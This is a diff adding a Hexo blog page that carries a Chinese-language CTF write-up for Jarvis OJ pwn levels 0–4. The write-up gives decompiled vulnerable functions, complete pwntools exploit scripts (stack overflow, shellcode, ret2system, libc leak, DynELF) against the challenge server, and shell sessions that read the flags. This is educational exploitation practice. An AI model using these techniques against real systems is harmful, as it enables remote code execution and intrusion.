@@ -1,0 +1,964 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="zh-Hans">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/">
+
+
+
+
+
+  <title>Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/JarvisOJ-pwn-0-4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/22/JarvisOJ-pwn-0-4/" itemprop="url">JarvisOJ-pwn-0~4</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-22T14:37:36+08:00">
+                2019-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Jarvis-OJ-PWN题wp（level0-level4）"><a href="#Jarvis-OJ-PWN题wp（level0-level4）" class="headerlink" title="Jarvis OJ PWN题wp（level0 - level4）"></a>Jarvis OJ PWN题wp（level0 - level4）</h1><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><blockquote>
+<p>这题注意是x64的，开始做的时候把rbp当0x4h计算了…脑抽了</p>
+</blockquote>
+<p><code>main</code>函数反编译：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function(<span class="number">1L</span>L, <span class="string">"Hello, World\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>vulnerable_function</code>函数反编译：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>很明显的栈溢出漏洞，buf距离 <code>rbp</code> <code>80h</code>，而<code>read</code>最多可以读<code>200h</code>。<br>同时在程序中还可以发现这个：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@ubuntu  /mnt/hgfs/ctf/pwn/jarvis  objdump -T level0</span><br><span class="line"></span><br><span class="line">level0:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC SYMBOL TABLE:</span><br><span class="line">0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 write</span><br><span class="line">0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 system</span><br><span class="line">0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 <span class="built_in">read</span></span><br><span class="line">0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 __libc_start_main</span><br><span class="line">0000000000000000  w   D  *UND*	0000000000000000              __gmon_start__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ⚡ root@ubuntu  /mnt/hgfs/ctf/pwn/jarvis  objdump -t level0 | grep system</span><br><span class="line">0000000000000000       F *UND*	0000000000000000              system@@GLIBC_2.2.5</span><br><span class="line">0000000000400596 g     F .text	0000000000000010              callsystem</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>0x400596</code>处有一个<code>callsystem</code>函数，函数反编译如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>因此构造溢出字符串，使得<code>vulnerable_function</code>返回地址覆盖为<code>callsystem</code>的地址<br>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./level0')</span></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9881</span>)</span><br><span class="line">addr = p64(<span class="number">0x400596</span>)</span><br><span class="line"><span class="keyword">print</span> addr</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + addr</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>执行效果:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9881: Done</span><br><span class="line">\x96\x05@\x00\x00\x00\x00\x00</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;713ca3944e92180e0ef03171981dcd41&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
+<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><code>main</code>函数与level0一致，<code>vulnerable_function</code>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>相比level0，题中没有再给出一个可以直接利用的<code>system</code>函数，因此需要自己构造shellcode，并且劫持控制流返回到shellcode处，<code>vulnerable_function</code>会打印出buf的地址，且程序未开启NX保护，因此只需要将shellcode写入buf将<code>vulnerable_function</code>返回地址覆盖为buf中shellcode的位置（为了方便放在buf的开始部分）即可，exp如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9877</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust((<span class="number">0x88</span>+<span class="number">4</span>),<span class="string">'A'</span>)</span><br><span class="line">a = sh.recvline()[<span class="number">14</span>:<span class="number">-2</span>]</span><br><span class="line">payload  += p32(int(a,base = <span class="number">16</span>))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;82c2aa534a9dede9c3a0045d0fec8617&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><code>vulnerable_function</code>：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>函数中出现了<code>system</code>函数，思路为控制<code>read</code>返回到<code>system</code>函数，并且伪造参数，执行<code>system(&quot;/bin/sh&quot;)</code>，在程序中可以找到这个字符串：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@ubuntu  /ctf/pwn/jarvis  strings -a -t x ./level2 | grep bin</span><br><span class="line">  1024 /bin/sh</span><br></pre></td></tr></table></figure></p>
+<p>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9878</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">sys = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys) + p32(<span class="number">0xaaaaaaaa</span>) + p32(elf.search(<span class="string">'/bin/sh'</span>).next())</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>执行结果：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9878: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;1759d0cbd854c54ffa886cd9df3a3d52&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><blockquote>
+<p>不会写exp……</p>
+</blockquote>
+<p><code>vulunerable_function</code> :<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>同样的溢出点，但是这次没有直接给出可利用的代码，题目提供了<code>libc-2.19.so</code>，因此思路是首先控制<code>read</code>返回到<code>write</code>，控制<code>write</code>调用的参数，使其打印出<code>read</code>的got地址对应的值（即<code>read</code>的绝对地址），并使其返回到<code>vulnerable_function</code>，通过<code>write</code>打印得到的<code>read</code>绝对地址，利用绝对地址和在libc中查询到的<code>read</code>的libc地址计算出偏移，从而计算出system的绝对地址，继而构造<code>system(&#39;/bin/sh&#39;)</code>并执行。</p>
+<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9879</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">write_plt = hex(elf.plt[<span class="string">'write'</span>])</span><br><span class="line">read_got = hex(elf.got[<span class="string">'read'</span>])</span><br><span class="line">vuln_addr = hex(elf.symbols[<span class="string">'vulnerable_function'</span>])</span><br><span class="line">args = p32(<span class="number">0x01</span>) + p32(int(read_got, <span class="number">16</span>)) + p32(<span class="number">0x04</span>)</span><br><span class="line"></span><br><span class="line">payload_leak = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) </span><br><span class="line">payload_leak += p32(int(write_plt, base = <span class="number">16</span>)) </span><br><span class="line">payload_leak += p32(int(vuln_addr, base = <span class="number">16</span>)) </span><br><span class="line">payload_leak += args</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(payload_leak)</span><br><span class="line"></span><br><span class="line">re = sh.recv()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">print</span> re</span><br><span class="line">read_addr = u32(re)</span><br><span class="line">read_libc = <span class="number">0x000dd3e0</span></span><br><span class="line">offset =  read_addr - read_libc</span><br><span class="line">system_libc = <span class="number">0x00040310</span></span><br><span class="line">exit_libc = <span class="number">0x00033260</span></span><br><span class="line">system_addr = offset + system_libc</span><br><span class="line">exit_addr = offset + exit_libc</span><br><span class="line">binsh_addr = offset + <span class="number">0x162d4c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'payload :'</span> + payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>执行效果:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9879: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level3/level3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">�ck�</span><br><span class="line">payload :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\x93a�`�`�L�s�</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;d85346df5770f56f69025bc3f5f1d3d0&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><blockquote>
+<p>同样不会写exp…</p>
+</blockquote>
+<p>思路与level3大致相同，不过这次没有给出libc，百度了wp才知道需要用到DynELF模块暴力跑出system的地址<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="string">'9880'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x0804844b</span></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到system地址后需要向可执行段写入/bin/sh，因为开启了NX保护，这里选择向bss段写入</span></span><br><span class="line">bss_addr = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="comment">#不断返回到vuln，每次溢出都调用write，伪造参数，打印地址，利用DynELF得到system绝对地址</span></span><br><span class="line">    payload_leak = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(vuln_addr) + p32(<span class="number">0x1</span>) + p32(addr) + p32(<span class="number">0x4</span>)</span><br><span class="line">    sh.sendline(payload_leak)</span><br><span class="line">    leak = sh.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line">dyn = DynELF(leak, elf = ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = dyn.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造read参数，溢出返回到read，并向目标地址（bss段）写入/bin/sh</span></span><br><span class="line">payload_write = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0x0</span>) + p32(bss_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line">sh.sendline(payload_write)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>) <span class="comment">#这步结束后，再次返回到vuln</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用system函数</span></span><br><span class="line">useless_addr = <span class="number">0x11111111</span></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(useless_addr) + p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>执行效果：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9880: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level4'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Loading from <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level4'</span>: 0xf77de930</span><br><span class="line">[+] Resolving <span class="string">'system'</span> <span class="keyword">in</span> <span class="string">'libc.so'</span>: 0xf77de930</span><br><span class="line">[!] No ELF provided.  Leaking is much faster <span class="keyword">if</span> you have a copy of the ELF being leaked.</span><br><span class="line">[*] Trying lookup based on Build ID: de799a85b2ebc2929eb4585f009d0c5e6211f2f8</span><br><span class="line">[*] Skipping unavialable libc de799a85b2ebc2929eb4585f009d0c5e6211f2f8</span><br><span class="line">[*] .gnu.hash/.<span class="built_in">hash</span>, .strtab and .symtab offsets</span><br><span class="line">[*] Found DT_GNU_HASH at 0xf77afdd8</span><br><span class="line">[*] Found DT_STRTAB at 0xf77afde0</span><br><span class="line">[*] Found DT_SYMTAB at 0xf77afde8</span><br><span class="line">[*] .gnu.hash parms</span><br><span class="line">[*] <span class="built_in">hash</span> chain index</span><br><span class="line">[*] <span class="built_in">hash</span> chain</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;882130cf51d65fb705440b218e94e98e&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/TEST-BLOG/">
+
